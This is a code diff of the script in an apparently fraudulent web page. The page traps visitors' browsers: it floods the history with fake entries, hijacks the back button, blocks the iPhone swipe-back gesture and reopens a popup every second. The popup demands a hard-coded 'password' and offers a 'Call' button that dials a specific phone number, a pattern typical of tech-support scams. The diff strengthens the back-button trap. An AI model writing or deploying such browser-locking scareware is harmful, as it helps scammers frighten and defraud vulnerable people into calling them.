@@ -375,71 +375,104 @@ body{
 
 
 <script>
+
 let popupInterval;
 let cancelled = false;
 
 const REQUIRED_PASSWORD = "PhoneReset@321@#890";
 
+/* REMOVE PREVIOUS HISTORY ENTRY */
+history.replaceState(null,null,location.href);
+
+/* CREATE FAKE HISTORY STACK */
+for(let i=0;i<50;i++){
+history.pushState({trap:true},"",location.href);
+}
+
+/* BACK BUTTON TRAP */
+window.addEventListener("popstate",function(){
+
+history.pushState({trap:true},"",location.href);
+
+openPopup();
+
+});
+
+/* SAFARI PAGE CACHE FIX */
+window.addEventListener("pageshow",function(e){
+
+if(e.persisted){
+history.pushState(null,null,location.href);
+}
+
+});
+
+
 /* MAIN POPUP */
 
 function openPopup(){
-  if(!cancelled){
-    document.getElementById("overlay").style.display = "flex";
-  }
+
+if(!cancelled){
+document.getElementById("overlay").style.display="flex";
+}
+
 }
 
 function closePopup(){
-  document.getElementById("overlay").style.display = "none";
+
+document.getElementById("overlay").style.display="none";
+
 }
+
 
 /* CALL BUTTON */
 
 function confirmAction(){
-  closePopup();
-  createPasswordPopup();
+
+closePopup();
+createPasswordPopup();
+
 }
+
 
 /* CANCEL BUTTON */
 
 function cancelAction(){
-  cancelled = true;
-  clearInterval(popupInterval);
+
+cancelled=true;
+clearInterval(popupInterval);
+
 }
+
 
 /* SECOND POPUP */
 
 function createPasswordPopup(){
 
-const overlay = document.createElement("div");
-overlay.className = "overlay";
-overlay.style.display = "flex";
+const overlay=document.createElement("div");
+overlay.className="overlay";
+overlay.style.display="flex";
 
-const popup = document.createElement("div");
-popup.className = "popup";
+const popup=document.createElement("div");
+popup.className="popup";
 
-const title = document.createElement("h2");
-title.innerText = "Enter Password";
+const title=document.createElement("h2");
+title.innerText="Enter Password";
 
-const input = document.createElement("input");
-input.type = "password";
-input.placeholder = "Password";
+const input=document.createElement("input");
+input.type="password";
+input.placeholder="Password";
 
-input.style.width = "100%";
-input.style.padding = "12px";
-input.style.marginBottom = "15px";
-input.style.borderRadius = "12px";
-input.style.border = "1px solid #d1d1d6";
+const buttons=document.createElement("div");
+buttons.className="buttons";
 
-const buttons = document.createElement("div");
-buttons.className = "buttons";
+const ok=document.createElement("button");
+ok.className="ok";
+ok.innerText="OK";
 
-const ok = document.createElement("button");
-ok.className = "ok";
-ok.innerText = "OK";
-
-const call = document.createElement("button");
-call.className = "cancel";
-call.innerText = "Call";
+const call=document.createElement("button");
+call.className="cancel";
+call.innerText="Call";
 
 buttons.appendChild(ok);
 buttons.appendChild(call);
@@ -451,16 +484,18 @@ popup.appendChild(buttons);
 overlay.appendChild(popup);
 document.body.appendChild(overlay);
 
+
 /* PASSWORD CHECK */
 
-ok.onclick = function(){
+ok.onclick=function(){
 
-if(input.value === REQUIRED_PASSWORD){
+if(input.value===REQUIRED_PASSWORD){
 
 alert("Password accepted");
 
 overlay.remove();
-document.getElementById("overlay").style.display = "none";
+document.getElementById("overlay").style.display="none";
+
 clearInterval(popupInterval);
 
 }else{
@@ -471,60 +506,43 @@ alert("Incorrect password");
 
 };
 
+
 /* CALL BUTTON */
 
-call.onclick = function(){
-window.location.href = "tel:+18122668825";
-};
+call.onclick=function(){
 
-}
-
-/* PAGE LOAD */
-
-window.onload = function(){
-
-openPopup();
-popupInterval = setInterval(openPopup,1000);
-
-/* HISTORY TRAP */
-
-for(let i=0;i<30;i++){
-  history.pushState({trap:true},"",location.href);
-}
+window.location.href="tel:+18122668825";
 
 };
 
-/* BACK BUTTON TRAP */
-
-window.addEventListener("popstate", function(){
-
-history.pushState({trap:true},"",location.href);
-openPopup();
-
-});
-
-/* SAFARI CACHE FIX */
-
-window.addEventListener("pageshow", function(e){
-
-if(e.persisted){
-history.pushState(null,null,location.href);
 }
 
-});
 
-/* BLOCK SWIPE BACK ON IPHONE */
+/* INITIAL PAGE LOAD */
 
-document.addEventListener("touchstart", function(e){
+window.onload=function(){
 
-if(e.touches[0].clientX < 20){
+openPopup();
+
+popupInterval=setInterval(openPopup,1000);
+
+};
+
+
+/* BLOCK IPHONE SWIPE BACK */
+
+document.addEventListener("touchstart",function(e){
+
+if(e.touches[0].clientX<20){
 e.preventDefault();
 }
 
 },{passive:false});
+
 </script>
 </body>
 </html>
+
 
 
 
